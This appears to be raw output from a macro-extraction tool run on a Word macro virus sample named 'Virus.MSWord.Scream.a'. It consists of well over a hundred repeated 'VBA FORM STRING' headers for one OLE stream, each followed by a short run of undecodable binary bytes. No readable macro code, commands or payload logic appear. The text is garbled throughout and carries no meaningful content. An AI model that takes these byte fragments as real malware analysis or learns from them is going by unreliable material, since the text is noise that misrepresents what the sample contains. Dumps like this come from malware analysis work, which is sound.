VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R+om�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�J���X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��1<d��`�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ik$���#�%o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���7��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�D�i�h�2�s�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�<��*-w��t��SGN�Ɍ. �I��9k%�䒓��rPcf\w�J�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
` !dsA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�,,�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ׁ+C$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǳ7��Ŏ�(4�Q����=ETw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ζ�SU'I<���@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)Au�����%�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*de3�j��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\	s�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V\����q%"|�yˊ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l̲�Ge�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!ٯ_�-�־�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�_9�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��N��/��8�m�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R+om�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5R"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�J���X!d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
⪢��)(�''��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x����ഭ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@�Ut$�rQ� ��j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,� n�)cm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Jxғ'*���lB[5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G����A�h�KC����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����;ޔ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a!��U�FR#R�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��_F�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&ԓ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@^���C)dT�!�i�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A)��!XNM���7�8>%�{s���0��-D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D/k�K<�dn��R��\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�0mأ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��V�;t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�$��k�$*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&BZh^�e����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��A�Q�5-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�ZV����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)�����2�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V���N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pi\�4ݍE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pZ��F'pA^�a{�Gj�QN�H�i�Z�ڸbI�҅����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CI�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�l~��cر�mI����"�ϳ^���[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,u[R|�~�H��[�:cܿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u#H|@�(�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fG��j��gR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_Su����ϑ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��O]�K�mi��cΜҕ�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������5s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Q&<'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#�T�˻ ��4t����x4��Q�V��=(N�*���]�7�e�H�{[;����U�,���$�r�~�6��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y� n�d�k|@'�)�.6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1HC��ż
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>EZ\D�L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3x�CE�[}�Zi�toc�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gb���Cw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$oc��q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{<�g��Dwj
MUC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�!c�k|c���L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8��q��C����̑VY��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S����9�8L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r�'�mE�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�������z�>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.�S���<���s�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F��'ຖ����G�P�{OI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ODƲ�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[ɸ�Q�_�kh�ݑ�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J��j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�G���P�J4F���ն
X����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�����"k]��3YV״�����#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5
m�6E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l���[��pkAϋ������F�+s��6gg�*A�(Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H"F�s�Q�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ϰ/B4'{����z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۈ��,�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sw�{��Yh���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c*����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�x!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

���/Z�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+X��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b���7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4N���7}����2J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z?�RI�ZR��5�ظK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R{ܴ�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3;�����|yT���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q%sʬ����N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�G	��-sB��L�G���_�l׻C�4�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$c&	�׏!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�5�J�9.i�)&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F����5"���8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d���^h�Ew��G5Ŏ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
ذ��=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��WK)��u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.<|���պ��-S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�b���<�[)�$��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nx��	�]�R|T�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]/.�]I[�xb_�Dv�.��e����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-�;ۥ���|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��l����3��w�z��%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��Q�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�]|�T���<	�{q$^>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǣ�8���#+o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`9sI#>�ui:9�igq���v��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�����T���Ԭk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ȹ+6�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������z��KK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֩w�D��zxt�~[MVr{e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}+��3~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rT>����;��!R�(�r���	�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zюx�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
